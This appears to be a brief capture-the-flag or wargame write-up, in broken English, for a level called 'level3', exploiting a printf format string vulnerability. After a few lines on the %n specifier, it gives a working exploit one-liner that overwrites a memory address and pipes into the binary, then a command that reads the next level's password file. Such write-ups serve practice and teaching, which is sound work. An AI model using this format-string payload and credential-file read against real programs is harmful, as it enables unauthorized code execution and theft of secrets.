there was only printf were we can act on. so let's check weird flags.
%n is intersting because, he write at the given address.
so how to give it adresse, printf use va_list , so due to calling convention, it will use task.



(python -c 'print  "\x8c\x98\x04\x08" + "A" * (0x40 - 4) + "%4$n"'; cat -) | ./level3

cat /home/user/level4/.pass
